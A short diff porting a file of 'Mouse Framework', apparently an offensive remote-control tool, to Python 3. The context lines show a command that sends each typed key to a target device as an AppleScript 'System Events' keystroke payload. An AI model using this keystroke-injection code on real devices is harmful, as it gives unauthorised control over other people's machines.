@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 #            ---------------------------------------------------
 #                              Mouse Framework                                 
@@ -50,7 +50,7 @@ class command:
         h.info_general("Device keyboard:")
         while 1:
             key = getch()
-            if key == chr(03):
+            if key == chr(3):
                 return ""
             payload = """tell application "System Events"
             keystroke \""""+key+"""\"
